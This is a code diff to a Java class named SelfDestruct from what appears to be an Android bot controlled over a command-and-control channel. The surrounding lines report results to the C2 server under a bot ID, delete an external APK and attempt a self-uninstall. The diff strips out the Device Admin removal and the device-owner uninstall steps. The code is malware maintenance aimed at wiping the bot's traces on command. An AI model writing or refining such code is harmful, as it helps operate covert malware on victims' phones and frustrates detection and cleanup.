@@ -59,19 +59,7 @@ public class SelfDestruct {
             log.append("[3] External APK delete error: ").append(e.getMessage()).append("\n");
         }
 
-        // ── 4. Remove Device Admin so uninstall is not blocked ────────────────
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
-            if (dpm != null && dpm.isAdminActive(admin)) {
-                dpm.removeActiveAdmin(admin);
-                log.append("[4] Device Admin removed\n");
-            } else {
-                log.append("[4] Not Device Admin — skipped\n");
-            }
-        } catch (Exception e) {
-            log.append("[4] Device Admin removal error: ").append(e.getMessage()).append("\n");
-        }
+        log.append("[4] Device Admin — not registered (skipped)\n");
 
         // Send partial report before uninstall kills the process
         c2.sendResult(botId, log.toString() + "[5] Attempting uninstall...\n");
@@ -131,16 +119,6 @@ public class SelfDestruct {
     }
 
     private static boolean tryDeviceOwnerUninstall(Context ctx, String pkg) {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            if (dpm == null || !dpm.isDeviceOwnerApp(pkg)) return false;
-            ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
-            // Ensure uninstall is not blocked by device policy, then fall through
-            // to PackageInstaller which is silent when caller is device owner
-            dpm.setUninstallBlocked(admin, pkg, false);
-        } catch (Exception e) {
-            Log.w(TAG, "device owner uninstall setup: " + e.getMessage());
-        }
         return false;
     }
 
